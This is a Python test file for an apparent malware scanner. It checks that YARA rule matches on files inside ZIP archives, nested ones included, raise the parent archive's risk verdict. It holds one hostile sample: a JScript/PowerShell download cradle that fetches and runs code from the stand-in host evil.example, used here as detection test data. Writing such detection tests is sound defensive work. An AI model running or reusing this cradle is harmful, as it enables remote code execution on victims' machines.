"""Tests for YARA scanning of archive members via scan_data.

Extends tests/test_yara_rules.py (loading/validation/detection) with
the archive-integration behaviour: rule matches on files *inside*
archives must drive the parent archive's verdict.
"""

from __future__ import annotations

import shutil
import zipfile
from pathlib import Path

import pytest

from engine.yara_engine import YARA_AVAILABLE, YaraEngine

REPO_RULES = Path(__file__).resolve().parent.parent / "signatures" / "yara"

CRADLE_JS = (
    'var sh = new ActiveXObject("wscript.shell");\n'
    'sh.Run("powershell -c iex(new-object net.webclient)'
    ".downloadstring('http://evil.example/p'));\n")


@pytest.fixture()
def rules_dir(tmp_path) -> Path:
    """Copy the repository's starter rules into the sandbox."""
    target = tmp_path / "yara"
    target.mkdir(exist_ok=True)
    for rule in REPO_RULES.glob("*.y*"):
        shutil.copy2(rule, target / rule.name)
    return target


def _analyzer(rules_dir: Path, tmp_path: Path):
    """FileAnalyzer with YARA over the sandboxed starter rules."""
    from engine.file_analyzer import FileAnalyzer
    from engine.signature_engine import SignatureEngine
    from database.database import Database

    database = Database(tmp_path / "member_yara.db")
    analyzer = FileAnalyzer(
        signature_engine=SignatureEngine(database=database),
        yara_engine=YaraEngine(rules_dir=rules_dir),
        hash_cache=False,
    )
    return analyzer, database


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_yara_matches_inside_zip_drive_verdict(rules_dir, tmp_path):
    """A rule-matching script inside a ZIP is flagged through YARA."""
    analyzer, database = _analyzer(rules_dir, tmp_path)
    archive = tmp_path / "dropper.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("invoice.js", CRADLE_JS)
        zf.writestr("readme.txt", "nothing to see here")

    detection = analyzer.analyze_path(archive)
    details = [str(f.get("detail", "")) for f in detection.factors]
    assert any("archive member: YARA rule" in d for d in details), details
    assert detection.risk_score >= 70
    database.close()


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_clean_zip_member_produces_no_yara_factor(rules_dir, tmp_path):
    """A ZIP with only benign members gets no YARA factor."""
    analyzer, database = _analyzer(rules_dir, tmp_path)
    archive = tmp_path / "clean.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("notes.txt", "plain text")
        zf.writestr("data.csv", "a,b,c\n1,2,3\n")

    detection = analyzer.analyze_path(archive)
    details = [str(f.get("detail", "")) for f in detection.factors]
    assert not any("archive member: YARA rule" in d for d in details)
    database.close()


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_nested_archive_member_yara_match(rules_dir, tmp_path):
    """YARA covers members of archives nested inside archives."""
    analyzer, database = _analyzer(rules_dir, tmp_path)
    inner = tmp_path / "inner.zip"
    with zipfile.ZipFile(inner, "w") as zf:
        zf.writestr("payload.js", CRADLE_JS)
    outer = tmp_path / "outer.zip"
    with zipfile.ZipFile(outer, "w") as zf:
        zf.write(inner, "inner.zip")

    detection = analyzer.analyze_path(outer)
    details = [str(f.get("detail", "")) for f in detection.factors]
    assert any("archive member: YARA rule" in d for d in details), details
    database.close()


@pytest.mark.skipif(not YARA_AVAILABLE, reason="yara-python not installed")
def test_scan_data_handles_empty_buffer(rules_dir):
    """An empty buffer scans cleanly (no match, no crash)."""
    engine = YaraEngine(rules_dir=rules_dir)
    assert engine.scan_data(b"") in (None, [])
